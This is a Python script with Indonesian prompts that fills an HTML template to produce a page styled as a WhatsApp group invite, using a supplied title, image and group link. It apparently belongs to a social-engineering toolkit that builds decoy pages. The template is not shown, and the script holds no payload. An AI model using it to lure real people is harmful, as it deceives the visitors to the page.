#!/usr/bin/env python3

import os
import shutil
import utils

a = "\033[1;30m"
m = "\033[1;31m"
p = "\033[1;37m"
r = "\033[0m"
h = "\033[1;32m"

title = os.getenv('TITLE')
image = os.getenv('IMAGE')
redirect = os.getenv('REDIRECT')

if title is None:
    title = input(f'\n{a}[{m}?{a}] {p}Judul Group{m} : {a}')
else:
    utils.print(f'{a}[{m}?{a}] {p}Judul Group{m} :{a} '+title)

if image is None:
    image = input(f'{a}[{m}?{a}] {p}Path Ke Gambar Group {a}({p}Best Size {m}: {p}300{m}×{p}300{a}){m} :{a}')
else:
    utils.print(f'{a}[{m}?{a}] {p}Gambar Group {m}:{a} '+image)

if redirect is None:
    redirect = input(f'{a}[{m}?{a}]' + p + f' Masukkan Link Group WhatsApp {m}:{a} ')
else:
    utils.print(f'{a}[{m}?{a}] {p}Link Group WhatsApp {m}:{a} '+redirect)

img_name = utils.downloadImageFromUrl(image, 'template/whatsapp_redirect/images/')
if img_name :
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    try:
        shutil.copyfile(image, 'template/whatsapp_redirect/images/{}'.format(img_name))
    except Exception as e:
        utils.print('\n' + a + '[{m}-{a}]' + p + f' Exception {m}:{a} ' + str(e))
        exit()

with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('REDIRECT_URL', redirect)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp_redirect/index.html', 'w') as new_index:
    new_index.write(code)
